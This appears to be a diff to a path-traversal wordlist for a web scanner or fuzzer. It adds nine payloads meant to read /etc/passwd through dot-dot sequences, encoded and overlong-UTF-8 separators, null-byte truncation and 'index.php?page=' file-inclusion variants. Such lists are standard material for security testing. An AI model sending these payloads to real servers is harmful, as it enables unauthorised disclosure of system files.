@@ -99,3 +99,12 @@
 /?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 {{paths}}
 /eam/vib?id=/etc/passwd
+/..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
+/index.php?page=etc/passwd
+/index.php?page=etc/passwd%00
+/index.php?page=../../etc/passwd
+/index.php?page=....//....//etc/passwd
+/../../../../../../../../../etc/passwd
